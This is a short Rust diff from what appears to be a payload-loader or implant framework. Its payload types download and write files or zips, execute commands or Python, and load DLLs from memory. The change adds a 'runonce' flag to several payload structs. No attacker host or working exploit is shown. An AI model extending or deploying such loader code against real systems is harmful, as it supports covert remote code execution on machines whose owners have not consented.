@@ -108,10 +108,10 @@ impl Payload {
     pub fn is_runonce(&self) -> bool {
         match &self {
             Payload::Banner() => false,
-            Payload::WriteFile(payload) => false,
-            Payload::WriteZip(payload) => false,
+            Payload::WriteFile(payload) => payload.runonce,
+            Payload::WriteZip(payload) => payload.runonce,
             Payload::Exec(payload) => payload.runonce,
-            Payload::ExecPython(payload) => false,
+            Payload::ExecPython(payload) => payload.runonce,
             Payload::DllFromMemory(payload) => payload.runonce,
         }
     }
@@ -190,6 +190,7 @@ pub struct ExecPython {
     pub path: String, //path of python directory
     pub python_code: String,
     pub thread: bool,
+    pub runonce: bool,
 }
 impl ExecPython {
     #[cfg(target_os = "linux")]
@@ -264,6 +265,7 @@ pub fn banner() -> Result<PayloadExecThread, anyhow::Error> {
 pub struct WriteZip {
     pub link: Link,
     pub path: String,
+    pub runonce: bool,
 }
 
 impl WriteZip {
@@ -295,6 +297,7 @@ pub struct WriteFile {
     pub link: Link,
     pub path: String,
     pub hash: String, // optionnal hash to verify if an existing file should be replaced or not.
+    pub runonce: bool,
 }
 
 impl WriteFile {
